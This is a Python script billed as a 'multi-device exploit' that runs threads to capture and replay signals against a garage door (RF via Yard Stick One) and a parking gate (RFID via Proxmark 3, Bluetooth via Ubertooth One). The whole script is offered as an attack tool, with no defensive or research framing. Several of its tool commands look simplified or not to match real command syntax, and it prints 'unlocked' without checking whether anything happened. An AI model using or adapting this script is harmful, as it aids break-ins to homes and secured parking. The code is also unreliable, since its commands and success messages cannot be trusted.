# -------------------------------------------
# Multi-Device Exploit: Garage Door + Parking Gate
# -------------------------------------------
# Functionality:
# - Exploits both a garage door system (RF) and a parking gate (RFID + Bluetooth) simultaneously.
# - Uses Yard Stick One for the garage door RF attack.
# - Uses Proxmark 3 for the parking gate RFID exploit and Ubertooth One for Bluetooth exploitation.

# Devices being used:
# - Yard Stick One: RF signal capture and replay (garage door).
# - Proxmark 3: RFID tag capture and cloning (parking gate RFID).
# - Ubertooth One: Bluetooth signal capture and replay (parking gate Bluetooth).
# 
# Example Usage:
# 1. Run the exploit to attack both the garage door and the parking gate simultaneously:
#    python multi_gate.py

import subprocess
import threading

# Function to exploit Garage Door using Yard Stick One (RF)
def exploit_garage_door():
    """
    Exploit the garage door using RF signals (via Yard Stick One).
    """
    print("[+] Attempting RF exploit on garage door...")
    subprocess.run(["yardstick-one", "capture", "-f", "garage_door_signal.dat"])  # Capture RF signal
    subprocess.run(["yardstick-one", "replay", "garage_door_signal.dat"])  # Replay RF signal to unlock
    print("[✔] Garage door unlocked via RF.")

# Function to exploit Parking Gate using Proxmark 3 (RFID)
def exploit_parking_gate_rfid():
    """
    Exploit the parking gate using RFID signals (via Proxmark 3).
    """
    print("[+] Attempting RFID exploit on parking gate...")
    subprocess.run(["proxmark3", "hf", "search"])  # Sniff for RFID tag
    subprocess.run(["proxmark3", "hf", "dump"])  # Capture RFID tag data
    subprocess.run(["proxmark3", "hf", "emulate"])  # Replay RFID tag to gain access
    print("[✔] Parking gate unlocked using RFID.")

# Function to exploit Parking Gate using Ubertooth One (Bluetooth)
def exploit_parking_gate_bluetooth():
    """
    Exploit the parking gate using Bluetooth signals (via Ubertooth One).
    """
    print("[+] Attempting Bluetooth exploit on parking gate...")
    subprocess.run(["ubertooth-btle", "sniff", "-f", "bluetooth_parking_gate_signal.dat"])  # Capture Bluetooth signal
    subprocess.run(["ubertooth-btle", "replay", "bluetooth_parking_gate_signal.dat"])  # Replay Bluetooth signal to unlock
    print("[✔] Parking gate unlocked via Bluetooth.")

# Main function to run the multi-device exploit
def multi_device_exploit():
    """
    Exploit both the garage door (RF) and parking gate (RFID + Bluetooth) simultaneously.
    """
    print("[+] Starting multi-device exploit on garage door and parking gate...")
    
    # Create threads for simultaneous garage door and parking gate exploits
    garage_door_thread = threading.Thread(target=exploit_garage_door)
    parking_gate_rfid_thread = threading.Thread(target=exploit_parking_gate_rfid)
    parking_gate_bluetooth_thread = threading.Thread(target=exploit_parking_gate_bluetooth)
    
    # Start all exploits simultaneously
    garage_door_thread.start()
    parking_gate_rfid_thread.start()
    parking_gate_bluetooth_thread.start()
    
    # Wait for all threads to finish
    garage_door_thread.join()
    parking_gate_rfid_thread.join()
    parking_gate_bluetooth_thread.join()
    
    print("[✔] Multi-device exploit completed.")

# Run the multi-device exploit
if __name__ == "__main__":
    multi_device_exploit()
